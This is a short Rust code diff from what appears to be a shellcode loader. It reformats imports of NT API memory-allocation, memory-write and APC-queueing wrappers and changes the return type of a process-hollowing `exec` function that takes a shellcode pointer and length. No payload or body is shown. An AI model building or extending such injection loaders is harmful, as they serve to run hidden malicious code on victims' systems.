@@ -1,7 +1,13 @@
-use crate::ntapi::{alloc_virtual_memory_at, PAGE_EXECUTE_READWRITE, write_virtual_memory, queue_apc_thread, resume_thread, close_handle};
+use crate::ntapi::{
+    alloc_virtual_memory_at, close_handle, queue_apc_thread, resume_thread, write_virtual_memory,
+    PAGE_EXECUTE_READWRITE,
+};
 
 #[cfg(feature = "run_process_hollowing")]
-pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), String> {
+pub unsafe fn exec(
+    shellcode_ptr: usize,
+    shellcode_len: usize,
+) -> crate::utils::error::RslResult<()> {
     #[cfg(feature = "debug")]
     crate::utils::print_message("Executing via Process Hollowing...");
 
